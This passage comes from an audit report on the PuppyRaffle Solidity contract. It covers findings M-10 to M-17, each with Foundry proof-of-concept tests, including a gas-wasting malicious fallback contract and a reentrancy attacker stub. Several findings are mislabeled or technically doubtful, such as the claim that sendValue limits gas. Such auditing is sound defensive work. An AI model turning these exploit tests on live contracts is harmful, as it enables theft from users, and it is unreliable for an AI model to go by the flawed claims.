        
        // Now Alice's transaction is processed, but it will fail
        vm.prank(alice);
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 4}(alicePlayers);
        
        // Check that Bob's transaction succeeded
        assertEq(puppyRaffle.getActivePlayerIndex(address(10)), 0, "Player should be in raffle");
        
        // Alice has to pay gas for a failed transaction
        console.log("Alice's transaction failed due to front-running");
        console.log("Alice spent gas but couldn't enter the raffle");
    }
}

## Suggested Mitigation
Implement a commit-reveal scheme where users first submit a hash of their entries, then reveal the actual addresses in a separate transaction. This prevents front-runners from seeing the exact addresses before they're committed.

Alternatively, allow duplicates but ensure a player can only be entered once by using a mapping:

```solidity
// Add this mapping to track players
mapping(address => bool) private isPlayerActive;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // Skip duplicates rather than reverting
        if (!isPlayerActive[player]) {
            players.push(player);
            isPlayerActive[player] = true;
        }
    }
    
    emit RaffleEnter(newPlayers);
}

// Update selectWinner to clear isPlayerActive mapping
function selectWinner() external {
    // Existing code...
    
    // Clear player tracking
    for (uint256 i = 0; i < players.length; i++) {
        isPlayerActive[players[i]] = false;
    }
    
    delete players;
    // Remaining code...
}

// Update refund to clear player status
function refund(uint256 playerIndex) public {
    // Existing checks...
    
    isPlayerActive[players[playerIndex]] = false;
    players[playerIndex] = address(0);
    
    // Remaining code...
}
```

## [M-10]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
The contract uses arithmetic operations without proper overflow/underflow checks. In Solidity ^0.7.6, there are no built-in overflow protections, and the contract performs multiplication and addition operations that could overflow, particularly in fee calculations and array length operations.

Vulnerable code:
```solidity
require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
totalAmountCollected = players.length * entranceFee;
prizePool = (totalAmountCollected * 80) / 100;
fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee);
```

## Impact
Integer overflow could lead to incorrect fee calculations, prize pool distributions, or entrance fee validations. This could result in users paying incorrect amounts, winners receiving wrong prizes, or the contract's accounting becoming corrupted.

## Proof of Concept
1. Set a high entrance fee (e.g., near uint256 max value)
2. Attempt to enter multiple players causing entranceFee * newPlayers.length to overflow
3. The overflow could result in a very small value, allowing users to enter for less than intended
4. Similarly, totalAmountCollected calculations could overflow, leading to incorrect prize distributions
5. totalFees addition could overflow when accumulated over time

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract OverflowTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    
    function setUp() public {
        vm.prank(owner);
        // Set entrance fee to a high value that could cause overflow
        puppyRaffle = new PuppyRaffle(2**255, owner, 1 days);
    }
    
    function testIntegerOverflow() public {
        address[] memory players = new address[](3);
        players[0] = address(2);
        players[1] = address(3);
        players[2] = address(4);
        
        // This should cause overflow in entranceFee * newPlayers.length
        uint256 entranceFee = 2**255;
        uint256 playersLength = 3;
        uint256 requiredValue = entranceFee * playersLength; // This overflows
        
        // Due to overflow, requiredValue might be very small
        console.log("Required value (overflowed):", requiredValue);
        console.log("Expected value:", entranceFee, "* 3");
        
        // If overflow occurs, user can enter with much less value than intended
        vm.deal(address(2), requiredValue);
        vm.prank(address(2));
        
        // This might succeed with a much smaller payment than intended
        if (requiredValue < entranceFee * 3) {
            puppyRaffle.enterRaffle{value: requiredValue}(players);
            console.log("Overflow exploit successful!");
        }
    }
}

## Suggested Mitigation
Use OpenZeppelin's SafeMath library or upgrade to Solidity ^0.8.0 which has built-in overflow protection:

```solidity
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;
    
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee.mul(newPlayers.length), "PuppyRaffle: Must send enough to enter raffle");
        // ... rest of function
    }
    
    function selectWinner() external {
        // ... other code
        uint256 totalAmountCollected = players.length.mul(entranceFee);
        uint256 prizePool = totalAmountCollected.mul(80).div(100);
        uint256 fee = totalAmountCollected.mul(20).div(100);
        totalFees = totalFees.add(uint64(fee));
        // ... rest of function
    }
}

// Or upgrade to Solidity ^0.8.0:
// pragma solidity ^0.8.0;
// // Built-in overflow protection, no SafeMath needed
```

## [M-11]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The selectWinner function contains duplicate code for calculating totalAmountCollected which could lead to inconsistencies. The same calculation (players.length * entranceFee) is performed and should be reused, but more importantly, there's an inconsistency in the integer casting where totalFees is updated with uint64(fee) while fee is uint256, potentially causing data loss.

Vulnerable code:
```solidity
totalAmountCollected = players.length * entranceFee;
prizePool = (totalAmountCollected * 80) / 100;
fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee); // Potential data loss from uint256 to uint64
```

## Impact
Casting from uint256 to uint64 could cause data loss if the fee amount exceeds the maximum value of uint64 (approximately 18 ETH). This would result in incorrect fee accounting and potential loss of protocol revenue.

## Proof of Concept
1. Set a high entrance fee or accumulate many players
2. Calculate fee = (totalAmountCollected * 20) / 100
3. If fee exceeds 2^64 - 1 (18.44 ETH), the cast to uint64 will truncate the value
4. totalFees will be updated with the truncated value instead of the actual fee
5. Protocol loses tracking of actual fees collected
6. Subsequent withdrawFees calls may fail or withdraw incorrect amounts

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerCastingTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    
    function setUp() public {
        vm.prank(owner);
        // Set high entrance fee to test casting issues
        puppyRaffle = new PuppyRaffle(10 ether, owner, 1 days);
    }
    
    function testUint64CastingDataLoss() public {
        // Create scenario where fee calculation exceeds uint64 max
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 100));
            vm.deal(players[i], 10 ether);
        }
        
        // Enter raffle with high value
        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: 40 ether}(players);
        
        // Fast forward time
        vm.warp(block.timestamp + 1 days + 1);
        
        // Calculate expected fee
        uint256 totalAmountCollected = 4 * 10 ether; // 40 ether
        uint256 expectedFee = (totalAmountCollected * 20) / 100; // 8 ether
        uint64 castedFee = uint64(expectedFee);
        
        console.log("Expected fee (uint256):", expectedFee);
        console.log("Casted fee (uint64):", castedFee);
        console.log("Max uint64:", type(uint64).max);
        
        // If expectedFee > type(uint64).max, we have data loss
        if (expectedFee > type(uint64).max) {
            console.log("Data loss detected!");
            assertNotEq(expectedFee, uint256(castedFee));
        }
        
        puppyRaffle.selectWinner();
    }
}

## Suggested Mitigation
Use consistent data types throughout the contract and add overflow checks for type casting:

```solidity
// Option 1: Use uint256 for totalFees consistently
uint256 public totalFees; // Change from uint64 to uint256

function selectWinner() external {
    // ... other code
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + fee; // No casting needed
    // ... rest of function
}

// Option 2: Add overflow check if keeping uint64
function selectWinner() external {
    // ... other code
    uint256 fee = (totalAmountCollected * 20) / 100;
    require(fee <= type(uint64).max, "PuppyRaffle: Fee exceeds uint64 max");
    totalFees = totalFees + uint64(fee);
    // ... rest of function
}

// Option 3: Use SafeCast from OpenZeppelin
import "@openzeppelin/contracts/utils/math/SafeCast.sol";

using SafeCast for uint256;

function selectWinner() external {
    // ... other code
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + fee.toUint64(); // Will revert if overflow
    // ... rest of function
}
```

## [M-12]. Unchecked Return issue in PuppyRaffle::selectWinner

## Description
The selectWinner and withdrawFees functions use low-level call operations without proper return value checking. While the functions do check the success boolean, they don't handle the case where the call succeeds but the recipient contract's fallback function consumes all available gas or performs unexpected operations.

Vulnerable code:
```solidity
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

(bool success, ) = feeAddress.call{value: feesToWithdraw}("");
require(success, "PuppyRaffle: Failed to withdraw fees");
```

## Impact
While the success value is checked, the functions don't limit gas for the external calls, potentially allowing malicious recipients to consume excessive gas or perform reentrancy attacks through their fallback functions. This could lead to denial of service or unexpected state changes.

## Proof of Concept
1. Malicious winner contract implements a fallback function that consumes lots of gas
2. When selectWinner calls winner.call{value: prizePool}, the malicious fallback executes
3. The fallback function could perform reentrancy attacks or consume excessive gas
4. Even though success is checked, the damage is already done
5. Similar attack vector exists for withdrawFees function

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MaliciousWinner {
    uint256 public gasConsumed;
    
    fallback() external payable {
        // Consume excessive gas
        uint256 gasStart = gasleft();
        while (gasleft() > gasStart / 2) {
            // Waste gas
        }
        gasConsumed = gasStart - gasleft();
    }
}

contract UncheckedReturnTest is Test {
    PuppyRaffle puppyRaffle;
    MaliciousWinner maliciousWinner;
    address owner = address(1);
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, owner, 1 days);
        maliciousWinner = new MaliciousWinner();
    }
    
    function testMaliciousWinnerGasConsumption() public {
        // Setup players with malicious winner
        address[] memory players = new address[](4);
        players[0] = address(maliciousWinner);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        
        // Fund players
        for (uint256 i = 0; i < 4; i++) {
            vm.deal(players[i], 1 ether);
        }
        
        // Enter raffle
        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        // Fast forward time
        vm.warp(block.timestamp + 1 days + 1);
        
        // This will succeed but malicious winner will consume excessive gas
        uint256 gasBefore = gasleft();
        puppyRaffle.selectWinner();
        uint256 gasUsed = gasBefore - gasleft();
        
        console.log("Gas used by selectWinner:", gasUsed);
        console.log("Gas consumed by malicious winner:", maliciousWinner.gasConsumed());
        
        // Verify the call succeeded despite gas consumption
        assertEq(puppyRaffle.previousWinner(), address(maliciousWinner));
    }
}

## Suggested Mitigation
Use OpenZeppelin's Address.sendValue which limits gas and provides better security, or implement gas limits for low-level calls:

```solidity
import "@openzeppelin/contracts/utils/Address.sol";

using Address for address payable;

function selectWinner() external {
    // ... other code
    
    // Use sendValue instead of low-level call
    payable(winner).sendValue(prizePool);
    
    // ... rest of function
}

function withdrawFees() external {
    // ... other code
    
    // Use sendValue instead of low-level call
    payable(feeAddress).sendValue(feesToWithdraw);
    
    // ... rest of function
}

// Alternative: Limit gas for low-level calls
function selectWinner() external {
    // ... other code
    
    (bool success, ) = winner.call{value: prizePool, gas: 2300}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    
    // ... rest of function
}
```

## [M-13]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in the PuppyRaffle contract makes an external call to transfer the prize pool to the winner before updating the state variables. This creates a potential reentrancy vulnerability, as the winner could be a malicious contract that calls back into the PuppyRaffle contract during the prize transfer.

```solidity
function selectWinner() external {
    // ... other code ...
    
    // Reset state after winner selection
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    
    // Transfer prize to winner - This happens AFTER state updates
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    
    _safeMint(winner, tokenId);
}
```

Although the state variables are updated before the external call, which would normally prevent reentrancy attacks, there is still a vulnerability because `_safeMint` makes an external call to the winner if they are a contract (to check if they can receive ERC721 tokens).

## Impact
A malicious winner could reenter the contract during the `_safeMint` operation. While they wouldn't be able to drain additional funds directly (since state is updated before the value transfer), they could potentially exploit other functions that rely on the contract's state. For example, they could call `withdrawFees` during the reentrancy attack to extract additional funds if the timing is right.

## Proof of Concept
1. A malicious actor creates a contract that implements both `onERC721Received` (to receive ERC721 tokens) and a fallback function.
2. The malicious contract enters the raffle.
3. When selected as a winner, the PuppyRaffle contract transfers the prize pool to the malicious contract.
4. The PuppyRaffle contract then calls `_safeMint`, which calls `onERC721Received` on the malicious contract.
5. Inside `onERC721Received`, the malicious contract can call back into PuppyRaffle functions.
6. While direct fund theft is prevented by the state update ordering, the malicious contract could potentially interact with other functions in unexpected ways.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract MaliciousReentrancyContract is IERC721Receiver {
    PuppyRaffle puppyRaffle;
    bool public attacked = false;
    
    constructor(address _puppyRaffleAddress) {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
    }
    
    // Function to enter the raffle
    function enterRaffle() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
    }
    
    // This function is called during _safeMint
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        // Prevent recursive attacks
        if (!attacked) {
            attacked = true;
            
            // Here we could call puppyRaffle functions
            // For demonstration, we'll check if we can cause unexpected behavior
            // For example, try to call withdrawFees() if the conditions allow
            // This is a simplified example - the actual attack would depend on the specific contract state
            
            // In a real attack, we might do something like:
            // try puppyRaffle.withdrawFees() { } catch { }
        }
        
        return IERC721Receiver.onERC721Received.selector;
    }
    
    // To receive the prize pool
    receive() external payable {}
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    MaliciousReentrancyContract maliciousContract;
    uint256 entranceFee = 1e18;
    address owner = address(1);
    address player1 = address(2);
    address player2 = address(3);
    address player3 = address(4);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            1 weeks
        );
        
        maliciousContract = new MaliciousReentrancyContract(address(puppyRaffle));
        
        // Fund the malicious contract
        vm.deal(address(maliciousContract), entranceFee);
        
        // Create a list of players including our malicious contract
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = address(maliciousContract);
        
        // Enter the raffle
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players[0:3]);
        maliciousContract.enterRaffle{value: entranceFee}();
        
        // Move time forward so the raffle can be completed
        vm.warp(block.timestamp + 1 weeks + 1);
    }
    
    function testReentrancyVulnerability() public {
        // In a real scenario, we would need to manipulate randomness to make the malicious contract win
        // This is simplified for demonstration purposes
        
        // Select winner
        puppyRaffle.selectWinner();
        
        // Check if the attack was attempted
        bool attackAttempted = maliciousContract.attacked();
        console.log("Attack attempted: ", attackAttempted);
        
        // Note: The actual impact depends on what other vulnerabilities exist in the contract
        // This test demonstrates that reentrancy is possible, but its full exploitation
        // would depend on specific contract conditions
    }
}

## Suggested Mitigation
To prevent reentrancy attacks, use a nonReentrant modifier from OpenZeppelin's ReentrancyGuard for the `selectWinner` function. This would prevent any reentrant calls into the contract during the execution of this function.

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    // ... existing code ...
    
    function selectWinner() external nonReentrant {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees += uint64(fee);
        
        uint256 tokenId = totalSupply();
        
        // Determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }
        
        // Reset state for next raffle
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        
        // Transfer prize
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        
        _safeMint(winner, tokenId);
    }
    
    // ... rest of the contract ...
}
```

The `nonReentrant` modifier prevents any function with this modifier from being called again while it is still executing, effectively blocking reentrancy attacks.

## [M-14]. Zero Code issue in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract uses `address(0)` to mark a player as refunded. This creates a vulnerability because the contract doesn't verify if a new player's address is the zero address when entering the raffle.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );
    
    players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee); 

    emit RaffleRefunded(playerAddress);
}
```

## Impact
This design choice has multiple negative consequences:
1. It allows an attacker to steal fees by entering with address(0) and then claiming that spot wasn't refunded
2. It skews the winner selection since address(0) entries are still counted in the player array length
3. It affects the fee calculation as address(0) entries are still counted when calculating totalAmountCollected
4. It risks sending prize funds to address(0) if it's selected as the winner

## Proof of Concept
1. A malicious actor enters the raffle using address(0) (this isn't prevented by the contract)
2. When selectWinner is called, if address(0) is selected as the winner, the prize pool is sent to address(0), effectively burning the funds
3. Even if address(0) isn't selected as winner, its presence skews the randomness and the prize pool calculation
4. The contract will transfer fees based on the total player count including address(0) entries

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressTest is Test {
    PuppyRaffle raffle;
    address player1 = address(0x1);
    address player2 = address(0x2);
    address zeroAddress = address(0);
    
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(this), 1 days);
    }
    
    function testZeroAddressVulnerability() public {
        // Create an array with address(0) as one of the players
        address[] memory players = new address[](3);
        players[0] = player1;
        players[1] = zeroAddress; // Use zero address as a player
        players[2] = player2;
        
        // Enter the raffle - this will work because there's no check against address(0)
        raffle.enterRaffle{value: 3 ether}(players);
        
        // Verify the zero address is in the players array
        assertEq(raffle.getActivePlayerIndex(zeroAddress), 1);
        
        // Fast forward time so raffle can be concluded
        vm.warp(block.timestamp + 1 days + 1);
        
        // Get the initial balance of the fee address
        address feeAddress = raffle.feeAddress();
        uint256 initialFeeAddressBalance = address(feeAddress).balance;
        
        // Call selectWinner - this could potentially select the zero address
        raffle.selectWinner();
        
        // Check if fees were calculated incorrectly due to address(0) being counted
        uint256 expectedFees = (3 * 1 ether * 20) / 100; // 20% of 3 ETH
        uint256 actualFees = address(feeAddress).balance - initialFeeAddressBalance;
        
        // This will pass if the fees are calculated based on all players including address(0)
        assertEq(actualFees, expectedFees);
        
        // Check if the zero address was potentially selected as the winner
        address winner = raffle.previousWinner();
        console.log("Winner address:", winner);
        
        // If address(0) was chosen as the winner, the prize would be lost forever
        if (winner == zeroAddress) {
            console.log("Zero address was selected as the winner! Funds are lost!");
        }
    }
    
    function testZeroAddressRefundExploit() public {
        // First, let's try to refund a player that doesn't exist (index 0)
        // This should revert because players[0] is address(0) by default
        vm.expectRevert();
        raffle.refund(0);
        
        // Now let's add a legitimate player
        address[] memory players = new address[](1);
        players[0] = player1;
        raffle.enterRaffle{value: 1 ether}(players);
        
        // Player1 can refund themselves
        vm.prank(player1);
        raffle.refund(0);
        
        // After refund, players[0] is now address(0)
        // If we try to check if they're active, getActivePlayerIndex should return 0
        // because address(0) is at index 0, which could be misinterpreted as "not active"
        assertEq(raffle.getActivePlayerIndex(address(0)), 0);
    }
}

## Suggested Mitigation
Instead of using address(0) to mark refunded players, maintain a separate mapping to track refunded players or use a more explicit data structure. Here's a suggested implementation:

```solidity
// Add this mapping to the contract state
mapping(address => bool) private refundedPlayers;

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(
        !refundedPlayers[playerAddress],
        "PuppyRaffle: Player already refunded"
    );
    
    // Mark as refunded instead of setting to address(0)
    refundedPlayers[playerAddress] = true;
    payable(msg.sender).sendValue(entranceFee);

    emit RaffleRefunded(playerAddress);
}

// Modify selectWinner to handle refunded players
function selectWinner() external {
    // ... existing code ...
    
    // Count active (non-refunded) players
    uint256 activePlayerCount = 0;
    for (uint256 i = 0; i < players.length; i++) {
        if (!refundedPlayers[players[i]]) {
            activePlayerCount++;
        }
    }
    
    require(activePlayerCount >= 4, "PuppyRaffle: Need at least 4 active players");
    
    // ... adjust winner selection and prize calculation to use activePlayerCount ...
    
    // Reset for next raffle
    for (uint256 i = 0; i < players.length; i++) {
        refundedPlayers[players[i]] = false;
    }
    delete players;
    
    // ... rest of the function ...
}

// Also add a check in enterRaffle to prevent address(0)
function enterRaffle(address[] memory newPlayers) public payable {
    // ... existing code ...
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(newPlayers[i] != address(0), "PuppyRaffle: Zero address cannot enter raffle");
        players.push(newPlayers[i]);
    }
    
    // ... rest of the function ...
}
```

## [M-15]. Gas Grief BlockLimit issue in PuppyRaffle::_isActivePlayer

## Description
The `_isActivePlayer()` function is inefficient and uses a loop to check if a player is active, which could consume excessive gas and potentially exceed the block gas limit as the number of players grows. The vulnerable code:
```solidity
function _isActivePlayer() internal view returns (bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == msg.sender) {
            return true;
        }
    }
    return false;
}
```

## Impact
As the players array grows, the gas cost for checking if a player is active increases linearly. This makes functions that call `_isActivePlayer()` increasingly expensive and could potentially exceed the block gas limit, preventing those functions from being called.

## Proof of Concept
1. A raffle accumulates a large number of players (e.g., thousands)
2. Any function that calls `_isActivePlayer()` must iterate through the entire players array
3. For a large number of players, the gas cost could exceed the block gas limit
4. This prevents players from using functions that depend on `_isActivePlayer()`

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IsActivePlayerGasTest is Test {
    PuppyRaffle puppyRaffle;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            0.01 ether,              // entrance fee
            address(this),           // fee address
            1 days                   // raffle duration
        );
    }
    
    function testIsActivePlayerGasUsage() public {
        // Add increasingly more players and measure gas usage
        uint256[] memory gasCosts = new uint256[](5);
        uint256[] memory playerCounts = new uint256[](5);
        
        // Test with different player counts: 10, 100, 500, 1000, 2000
        playerCounts[0] = 10;
        playerCounts[1] = 100;
        playerCounts[2] = 500;
        playerCounts[3] = 1000;
        playerCounts[4] = 2000;
        
        for (uint256 i = 0; i < playerCounts.length; i++) {
            // Reset contract for each test
            puppyRaffle = new PuppyRaffle(
                0.01 ether,              // entrance fee
                address(this),           // fee address
                1 days                   // raffle duration
            );
            
            // Setup players
            address[] memory players = new address[](playerCounts[i]);
            for (uint256 j = 0; j < playerCounts[i]; j++) {
                players[j] = address(uint160(j + 1));
            }
            
            // Enter the raffle
            vm.deal(address(this), playerCounts[i] * 0.01 ether);
            puppyRaffle.enterRaffle{value: playerCounts[i] * 0.01 ether}(players);
            
            // Measure gas usage for checking if the last player is active
            vm.prank(players[playerCounts[i] - 1]);
            uint256 gasStart = gasleft();
            puppyRaffle.getActivePlayerIndex(players[playerCounts[i] - 1]);
            uint256 gasUsed = gasStart - gasleft();
            
            gasCosts[i] = gasUsed;
            
            console.log("Player count:", playerCounts[i], "Gas used:", gasUsed);
        }
        
        // Verify gas cost increases linearly with player count
        for (uint256 i = 1; i < playerCounts.length; i++) {
            assertGt(gasCosts[i], gasCosts[i-1], "Gas cost should increase with more players");
        }
    }
}

## Suggested Mitigation
Use a mapping to efficiently check if an address is an active player, instead of looping through the entire array:

```solidity
// Add a mapping to track active players
mapping(address => bool) public isActivePlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    // ... existing code ...
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        require(!isActivePlayer[player], "PuppyRaffle: Duplicate player");
        
        isActivePlayer[player] = true;
        players.push(player);
    }
    
    // ... rest of the function ...
}

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    // ... existing checks ...
    
    players[playerIndex] = address(0);
    isActivePlayer[playerAddress] = false;
    
    // ... rest of the function ...
}

function _isActivePlayer() internal view returns (bool) {
    return isActivePlayer[msg.sender];
}

function selectWinner() external {
    // ... existing code ...
    
    // Reset player tracking
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            isActivePlayer[players[i]] = false;
        }
    }
    delete players;
    
    // ... rest of the function ...
}
```

## [M-16]. Confidential Data issue in PuppyRaffle::changeFeeAddress

## Description
The contract doesn't validate that the `feeAddress` is not the zero address in the constructor or when changed, which could lead to fees being permanently lost. The vulnerable code:
```solidity
constructor(
    uint256 _entranceFee,
    address _feeAddress,
    uint256 _raffleDuration
) ERC721("Puppy Raffle", "PR") {
    entranceFee = _entranceFee;
    feeAddress = _feeAddress;
    // ... other code ...
}

function changeFeeAddress(address newFeeAddress) external onlyOwner {
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```

## Impact
If the feeAddress is accidentally set to the zero address, all fees will be permanently lost when withdrawn. This represents a complete loss of protocol revenue with no way to recover the funds.

## Proof of Concept
1. The contract owner accidentally sets the feeAddress to the zero address
2. Fees accumulate in the contract
3. When withdrawFees is called, the funds are sent to the zero address
4. The funds are permanently lost with no way to recover them

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressTest is Test {
    PuppyRaffle puppyRaffle;
    address feeAddress = makeAddr("feeAddress");
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            1 ether,                 // entrance fee
            feeAddress,              // fee address
            1 days                   // raffle duration
        );
        
        // Setup a completed raffle to generate fees
        address[] memory players = new address[](4);
        players[0] = makeAddr("player1");
        players[1] = makeAddr("player2");
        players[2] = makeAddr("player3");
        players[3] = makeAddr("player4");
        
        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        // Fast forward to end of raffle and select winner to generate fees
        vm.warp(block.timestamp + 1 days);
        puppyRaffle.selectWinner();
        
        // Verify fees were collected
        assertGt(puppyRaffle.totalFees(), 0, "Fees should be collected");
    }
    
    function testZeroAddressFeeAddress() public {
        // Change fee address to zero address
        address zeroAddress = address(0);
        puppyRaffle.changeFeeAddress(zeroAddress);
        
        // Verify fee address is set to zero
        assertEq(puppyRaffle.feeAddress(), zeroAddress, "Fee address should be zero");
        
        // Withdraw fees to zero address - this would send funds to address(0)
        uint256 feesAmount = puppyRaffle.totalFees();
        puppyRaffle.withdrawFees();
        
        // Fees are now lost forever
        assertEq(puppyRaffle.totalFees(), 0, "Fees should be reset to zero");
        assertEq(zeroAddress.balance, feesAmount, "Funds sent to zero address");
    }
}

## Suggested Mitigation
Add zero address validation to both the constructor and the changeFeeAddress function:

```solidity
constructor(
    uint256 _entranceFee,
    address _feeAddress,
    uint256 _raffleDuration
) ERC721("Puppy Raffle", "PR") {
    entranceFee = _entranceFee;
    
    // Add zero address check
    require(_feeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
    feeAddress = _feeAddress;
    
    raffleDuration = _raffleDuration;
    raffleStartTime = block.timestamp;
    
    // Initialize rarities as before
}

function changeFeeAddress(address newFeeAddress) external onlyOwner {
    // Add zero address check
    require(newFeeAddress != address(0), "PuppyRaffle: Fee address cannot be zero address");
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```

## [M-17]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function has a serious issue with balance validation. It verifies that the entire contract balance exactly matches the `totalFees` value, making it unusable when there are active players with funds in the contract.

```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
The function `withdrawFees()` will be unusable most of the time when there are active players in the raffle. Fees will accumulate but cannot be withdrawn until the contract happens to have exactly the amount of `totalFees` in its balance. This could lead to locked fees that cannot be withdrawn, especially if there are constantly new players entering the raffle.

## Proof of Concept
1. Start a raffle with several players (e.g., 10 players pay 1 ETH each)
2. Complete the raffle by calling selectWinner(), which results in 2 ETH fees being collected
3. Start a new raffle with new players entering
4. Try to call withdrawFees() - it will fail because the contract balance is now greater than totalFees
5. Fees remain locked in the contract as long as there are active players

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeesWithdrawalTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = address(1);
    address feeAddress = address(2);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function testWithdrawFeesFailure() public {
        // First raffle
        address[] memory players = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            players[i] = address(uint160(i + 10));
        }
        
        // Enter the raffle with 5 players
        puppyRaffle.enterRaffle{value: entranceFee * 5}(players);
        
        // Complete first raffle
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();
        
        // Check totalFees (should be 20% of 5 ETH = 1 ETH)
        uint64 totalFees = puppyRaffle.totalFees();
